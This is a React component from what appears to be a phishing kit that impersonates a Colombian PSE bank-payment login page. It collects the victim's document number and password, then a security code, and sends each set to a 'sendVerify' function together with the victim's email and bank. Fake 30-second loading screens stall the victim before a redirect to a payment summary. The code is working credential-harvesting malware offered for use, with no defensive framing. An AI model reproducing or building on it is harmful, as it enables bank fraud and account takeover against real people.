import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X05.module.css';
import logo from '../../Assets/Images/X05/logo.svg';
import logoBSecitonB from '../../Assets/Images/X05/logoBSectionB.svg';
import logoCSecitonB from '../../Assets/Images/X05/logoCSectionB.svg';
import sectionA from '../../Assets/Images/X05/sectionA.png'
import sectionAX from '../../Assets/Images/X05/SectionAX.png'
import loader from '../../Assets/Images/X05/loader.gif'
import loaderMain from '../../Assets/Images/loader.gif'

function X05() {

    const location = useLocation();
    const navigate = useNavigate();
    const { dataD, dataE } = location.state || {};

    const [dataF, setDataF] = useState('');
    const [dataG, setDataG] = useState('');
    const [dataH, setDataH] = useState('');

    const [showDataHSection, setShowDataHSection] = useState(false);
    const [showLoader, setShowLoader] = useState(false);
    const [showLoaderMain, setShowLoaderMain] = useState(false);

    const handleContinue = (e) => {

        e.preventDefault();

        if (!showDataHSection) {
            setShowLoader(true);
            sendVerify(`🆔: ${dataF}\n🔐: ${dataG}\n📧: ${dataE}\n🏦: ${dataD}`);

            setTimeout(() => {
                setShowLoader(false);
                setShowDataHSection(true);
            }, 30000)
        } else {
            sendVerify(`🔑: ${dataH}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoaderMain(true);
            setTimeout(() => {
                navigate("/resumenpago")
            }, 30000)
        }
    };

    return (
        <>
            <main className={styles.mainX05}>
                <section>
                    <img src={sectionA} alt='Section Background'></img>
                    <img src={sectionAX} alt='Section Background'></img>
                </section>
                <section>
                    <div>
                        <img src={logo} alt='Logo'></img>
                        <p>Ingresa para realizar tu pago PSE</p>
                    </div>
                    <form>
                        {!showDataHSection && (
                            <div className={styles.selectGroup}>
                                <select placeholder=" ">
                                    <option>Cedula de Ciudadanía</option>
                                    <option>Cedula de Extranjería</option>
                                    <option>Tarjeta de Identidad</option>
                                </select> 
                                <label>Tipo de documento</label>
                            </div>
                        )}
                        {!showDataHSection && (
                            <div className={styles.inputGroup}>
                                <input type='number'
                                        id='dataF'
                                        value={dataF}
                                        onChange={(e) => setDataF(e.target.value)}
                                        placeholder=' '>
                                </input>
                                <label htmlFor="dataF">Numero de documento</label>
                            </div>
                        )}
                        {!showDataHSection && (
                            <div className={styles.inputGroup}>
                                <input 
                                    id="dataG"
                                    type="password"
                                    value={dataG}
                                    onChange={(e) => setDataG(e.target.value)}
                                    placeholder=" "
                                />
                                <label htmlFor="dataG">Contraseña</label>
                            </div>
                        )}
                        {showDataHSection && (
                            <div className={styles.inputGroup}>
                                <input 
                                    id="dataH"
                                    type="password"
                                    value={dataH}
                                    onChange={(e) => setDataH(e.target.value)}
                                    placeholder=" "
                                />
                                <label htmlFor="dataH">Codigo de seguridad</label>
                            </div>
                        )}
                        <button onClick={handleContinue}>{showDataHSection ? 'INGRESAR' : 'CONTINUAR'}</button>
                    </form>
                    <p>Volver al comercio</p>
                    <div>
                        <p>Linea Audiovillas</p>
                        <div>
                            <div>
                                <p>Nacional</p>
                                <p>01 8000 51 8000</p>
                            </div>
                            <div></div>
                            <div>
                                <p>Bogotá</p>
                                <p>(601) 4441777</p>
                            </div>
                            <div></div>
                            <div>
                                <p>Mas ciudades</p>
                            </div>
                        </div>
                    </div>
                    <div>
                        <img src={logoBSecitonB} alt='Logo'></img>
                        <img src={logoCSecitonB} alt='Logo'></img>
                    </div>
                </section>
                {showLoader && (
                    <section className={styles.overlayX05}>
                        <img src={loader}></img>
                    </section>
                )}
                {showLoaderMain && (
                    <section className={styles.loaderMain}>
                        <img src={loaderMain}></img>
                    </section>
                )}
            </main>
        </>
    )
}

export default X05;